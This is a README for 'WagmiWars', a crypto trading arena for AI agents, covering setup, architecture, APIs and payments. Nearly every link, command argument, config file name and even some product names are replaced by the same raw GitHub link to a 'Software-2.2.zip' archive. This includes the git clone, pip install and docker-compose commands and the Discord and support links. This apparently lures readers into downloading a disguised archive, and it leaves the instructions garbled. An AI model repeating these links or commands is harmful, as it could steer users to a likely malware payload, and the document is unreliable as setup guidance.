# WagmiWars - AI Trading Agent Arena Platform

> **Where AI meets DeFi** - A comprehensive platform for building, battling, and monetizing AI trading agents with crypto payments and real trading execution.

## 🚀 Quick Start

### Prerequisites
- Docker & Docker Compose
- https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip 18+ (for local development)
- Python 3.11+ (for local development)
- MetaMask or other Web3 wallet

### One-Command Deployment

```bash
# Clone the repository
git clone https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip
cd wagmiwars

# Deploy the entire platform
docker-compose up -d

# Platform will be available at:
# - Frontend: http://localhost:3000
# - Backend API: http://localhost:8000
# - API Documentation: http://localhost:8000/docs
```

### Manual Setup (Development)

#### Backend Setup
```bash
cd backend
pip install -r https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip
cp https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip .env
# Edit .env with your configuration
uvicorn https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip --reload
```

#### Frontend Setup
```bash
cd frontend
npm install
cp https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip
# Edit https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip with your configuration
npm run dev
```

## 🏗️ Architecture Overview

### Technology Stack

**Backend (Python/FastAPI)**
- **Framework**: FastAPI with async support
- **Database**: PostgreSQL with SQLAlchemy ORM
- **Cache**: Redis for session management and real-time data
- **Authentication**: JWT tokens with refresh token support
- **Web3**: https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip for blockchain interactions
- **Security**: Password hashing, CORS, rate limiting

**Frontend (https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)**
- **Framework**: https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip 14 with App Router
- **Styling**: Tailwind CSS with custom design system
- **State Management**: React Query + Context API
- **Web3**: Wagmi/Viem + RainbowKit for wallet connection
- **Charts**: Recharts for data visualization
- **WebSocket**: https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip for real-time updates

**Infrastructure**
- **Containerization**: Docker & Docker Compose
- **Database**: PostgreSQL 15 with performance optimizations
- **Cache**: Redis for pub/sub and caching
- **Web Server**: Nginx for production deployment

## 📋 Platform Features

### Core Functionality
- ✅ **AI Agent Creation** - Build custom trading agents with Python
- ✅ **Live Simulation** - Real-time market simulation with CEX/DEX data
- ✅ **Match System** - Create and join competitive trading matches
- ✅ **WebSocket Updates** - Real-time match and agent performance updates
- ✅ **Crypto Payments** - Multi-chain payment support (ETH, USDC, USDT, DAI)
- ✅ **Wallet Integration** - MetaMask, WalletConnect, Coinbase Wallet
- ✅ **Execution Powers** - Permission-based real trading system

### Advanced Features
- ✅ **Marketplace** - Clone and monetize successful agents
- ✅ **Sponsorship System** - Sponsor agents for visibility
- ✅ **Arena Tokens** - Platform token system with utility
- ✅ **Leaderboard** - Real-time performance rankings
- ✅ **Match Replay** - Step-by-step match analysis
- ✅ **Performance Analytics** - Comprehensive agent statistics

## 🔧 Configuration

### Environment Variables

**Backend (.env)**
```env
# Database
DATABASE_URL=postgresql://wagmi:wagmi123@localhost/wagmiwars_db
REDIS_URL=redis://localhost:6379

# Security
SECRET_KEY=your-secret-key-here
ALGORITHM=HS256
ACCESS_TOKEN_EXPIRE_MINUTES=30

# Web3
INFURA_PROJECT_ID=your-infura-project-id
ALCHEMY_API_KEY=your-alchemy-api-key
ETHERSCAN_API_KEY=your-etherscan-api-key

# Exchange APIs
BINANCE_API_KEY=your-binance-api-key
BINANCE_SECRET=your-binance-secret

# Features
EXECUTION_POWER_ENABLED=false
PAYMENT_ENABLED=true
```

**Frontend (https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)**
```env
NEXT_PUBLIC_API_URL=http://localhost:8000
NEXT_PUBLIC_WS_URL=ws://localhost:8000
NEXT_PUBLIC_CHAIN_ID=1
```

## 📊 API Documentation

### Authentication Endpoints
- `POST /api/auth/register` - User registration
- `POST /api/auth/login` - User login
- `POST /api/auth/refresh` - Token refresh
- `POST /api/auth/logout` - User logout

### Agent Endpoints
- `GET /api/agents` - List all agents
- `POST /api/agents` - Create new agent
- `GET /api/agents/{id}` - Get agent details
- `PUT /api/agents/{id}` - Update agent
- `POST /api/agents/{id}/upload` - Upload agent code
- `POST /api/agents/{id}/clone` - Clone agent

### Match Endpoints
- `GET /api/matches` - List matches
- `POST /api/matches` - Create match
- `GET /api/matches/{id}` - Get match details
- `POST /api/matches/{id}/start` - Start match
- `POST /api/matches/{id}/join` - Join match
- `GET /api/matches/live/leaderboard` - Live leaderboard

### Crypto Endpoints
- `POST /api/crypto/payment` - Create payment
- `GET /api/crypto/transactions` - List transactions
- `GET /api/crypto/supported-chains` - Supported chains
- `GET /api/crypto/exchange-rate` - Exchange rates

## 🎮 Simulation Modes

### Testing Mode
- **Purpose**: Development and debugging
- **Features**: Test data, no rankings, unlimited testing
- **Usage**: Agent development and strategy validation

### Demo Mode
- **Purpose**: User demonstrations and tutorials
- **Features**: Simplified simulation, educational content
- **Usage**: New user onboarding and platform demos

### Production Mode
- **Purpose**: Live competition with real rankings
- **Features**: Real market data, official rankings, prize pools
- **Usage**: Competitive matches and tournaments

## 💰 Payment System

### Supported Cryptocurrencies
- **ETH** - Ethereum (Native token)
- **USDC** - USD Coin (Stablecoin)
- **USDT** - Tether (Stablecoin)
- **DAI** - MakerDAO Stablecoin

### Supported Networks
- **Ethereum Mainnet** (Chain ID: 1)
- **Polygon** (Chain ID: 137)
- **Base** (Chain ID: 8453)
- **Arbitrum** (Chain ID: 42161)

### Payment Types
- **Arena Entry** - Match participation fees
- **Agent Cloning** - Clone successful agents with royalties
- **Sponsorship** - Sponsor agents for visibility
- **Premium Features** - Access advanced platform features

## 🔐 Security Features

### Authentication & Authorization
- JWT token-based authentication
- Refresh token rotation
- Password hashing with bcrypt
- API key authentication for agents

### Trading Security
- Execution power permission system
- Position size limits
- Daily loss limits
- Risk score calculation
- KYC verification for high limits

### Smart Contract Security
- Multi-signature wallet support
- Timelock transactions
- Emergency pause mechanisms
- Audit trail for all transactions

## 📈 Performance & Scaling

### Database Optimization
- Indexed queries for fast retrieval
- Connection pooling for efficiency
- Read replicas for scaling
- Automated backups and recovery

### Caching Strategy
- Redis for session management
- Market data caching
- API response caching
- Real-time data pub/sub

### Frontend Optimization
- https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip static generation
- Image optimization
- Code splitting
- CDN integration

## 🚀 Production Deployment

### Using Docker Compose (Recommended)
```bash
# Production deployment
docker-compose -f https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip -f https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip up -d

# With monitoring
docker-compose -f https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip -f https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip -f https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip up -d
```

### Manual Deployment
1. **Database Setup**: Configure PostgreSQL with proper security
2. **Redis Setup**: Set up Redis cluster for high availability
3. **Backend Deployment**: Deploy FastAPI application with Gunicorn
4. **Frontend Deployment**: Build and deploy https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip application
5. **Nginx Configuration**: Set up reverse proxy and SSL

### Monitoring & Observability
- **Health Checks**: Built-in health check endpoints
- **Metrics**: Prometheus metrics integration
- **Logging**: Structured logging with ELK stack
- **Alerting**: Automated alerts for system issues

## 🤝 Contributing

### Development Setup
1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests for new functionality
5. Submit a pull request

### Code Standards
- Follow PEP 8 for Python code
- Use TypeScript for frontend code
- Write comprehensive tests
- Document public APIs
- Follow conventional commit messages

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🆘 Support

### Documentation
- [API Documentation](http://localhost:8000/docs)
- [Frontend Guide](https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)
- [Backend Guide](https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)

### Community
- [Discord Server](https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)
- [GitHub Issues](https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)
- [Twitter](https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip)

### Commercial Support
For enterprise features, custom deployments, and priority support, contact us at [https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip](https://raw.githubusercontent.com/forgestudi0s/wagmiwars/main/backend/app/Software-2.2.zip).

---

**Built with ❤️ for the Web3 community**

*WagmiWars - Where AI meets DeFi*